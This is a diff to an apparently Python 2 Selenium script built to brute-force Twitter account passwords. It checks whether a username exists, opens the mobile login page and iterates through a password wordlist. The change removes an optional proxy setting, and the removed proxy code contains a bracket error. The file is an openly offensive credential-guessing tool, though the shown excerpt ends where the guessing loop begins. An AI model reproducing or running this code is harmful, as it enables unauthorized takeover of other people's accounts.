@@ -2,7 +2,6 @@
 from time import sleep
 from selenium import webdriver
 from selenium.webdriver.common.keys import Keys
-from selenium.webdriver.common.proxy import *
 import sys
 reload(sys)
 sys.setdefaultencoding('utf8')
@@ -24,19 +23,8 @@ def twitUserCheck(username):
     except AssertionError:
         return 1
 
-def twitterBruteforce(username, wordlist, delay, proxy):
-	if proxy == False:
-		driver = webdriver.Firefox()
-	else:
-		proxy1 = proxy
-		pr0xy = Proxy({
-			'proxyType': ProxyType.MANUAL,
-			'httpProxy': proxy1,
-			'ftpProxy': '',
-			'sslProxy': proxy1,
-			'noProxy': '',
-		)}
-		driver = webdriver.Firefox(proxy=pr0xy)
+def twitterBruteforce(username, wordlist, delay):
+    driver = webdriver.Firefox()
     driver.get("https://mobile.twitter.com/session/new")
     wordlist = open(wordlist, 'r')
     for i in wordlist.readlines():
